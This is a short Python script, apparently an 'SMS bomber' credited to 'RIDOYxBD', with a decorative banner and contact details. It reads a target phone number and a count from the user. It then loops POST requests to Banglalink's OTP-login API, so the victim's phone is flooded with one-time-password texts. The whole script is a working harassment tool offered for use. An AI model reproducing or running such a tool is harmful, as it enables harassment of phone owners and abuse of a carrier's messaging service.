logo = ("""\033[1;32m
       


 _______     _____  ______      ___   ____  ____        ______   ______    
|_   __ \   |_   _||_   _ `.  .'   `.|_  _||_  _|      |_   _ \ |_   _ `.  
  | |__) |    | |    | | `. \/  .-.  \ \ \  / / _   __   | |_) |  | | `. \ 
  |  __ /     | |    | |  | || |   | |  \ \/ / [ \ [  ]  |  __'.  | |  | | 
 _| |  \ \_  _| |_  _| |_.' /\  `-'  /  _|  |_  > '  <  _| |__) |_| |_.' / 
|____| |___||_____||______.'  `.___.'  |______|[__]`\_]|_______/|______.'  
                                                                           

                                               
                                               

─────────────────────────────   \033
__________________×______________________
  
  Owner   :  Ridoy Hassan
 
  Github   :  RIDOYxBD

  Facebook : RIDOYxBD
  
  Youtube  : RIDOYxBD
  
  Contact  : +88019xxxxxx79
__________________×______________________\033[1;37m""")
print(logo)

import requests

# POST 

myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
number=str(input(" Enter Your Number : "))

amount=int(input(" Enter The Amount : "))

for i in range(amount):
    requests.post(myblapi,
    data=number)
    
    print(str(i+1)+"SMS Sent")